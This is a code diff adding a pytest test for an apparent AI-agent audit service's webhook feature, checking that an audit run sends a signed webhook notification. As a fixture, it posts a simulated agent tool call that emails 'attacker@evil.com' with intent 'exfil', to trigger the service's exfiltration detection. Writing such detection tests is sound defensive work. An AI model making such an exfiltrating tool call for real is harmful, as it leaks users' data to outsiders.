@@ -77,6 +77,32 @@ def test_byok_status_and_offline_audit(client):
     assert r.status_code == 200
     assert any(v["rule_id"] == "data_exfiltration" and v["violation"] for v in r.json())
 
+def test_webhook_endpoints_and_audit_fires_it(client, monkeypatch):
+    import httpx, json as _json
+    org = create_org("Acme", "u1")
+    key = create_api_key(org, "ci")
+    h = {"Authorization": f"Bearer {_jwt('u1')}"}
+
+    assert client.get("/webhooks", headers=h).json() == {"url": None, "secret": None}
+    r = client.put("/webhooks", json={"url": "https://example.com/hook"}, headers=h)
+    assert r.status_code == 200 and r.json()["url"] == "https://example.com/hook"
+    secret = r.json()["secret"]
+
+    calls = []
+    monkeypatch.setattr(httpx, "post", lambda url, content, headers, timeout: calls.append(
+        (url, content, headers)))
+    client.post("/events", json={"agent_id": "a", "session_id": "wh", "kind": "tool_call",
+                "tool": "send_email", "args": {"to": "attacker@evil.com"}, "intent": "exfil"},
+                headers={"Authorization": f"Bearer {key}"})
+    client.post("/audit/wh", headers=h)
+    assert len(calls) == 1
+    body = _json.loads(calls[0][1])
+    assert body["session_id"] == "wh"
+    assert calls[0][2]["X-Teluvane-Signature"]
+
+    r2 = client.delete("/webhooks", headers=h)
+    assert r2.status_code == 200 and client.get("/webhooks", headers=h).json()["url"] is None
+
 def test_custom_policy_rule_requires_pro_and_feeds_offline_audit(client):
     org = create_org("Acme", "u1")
     key = create_api_key(org, "ci")
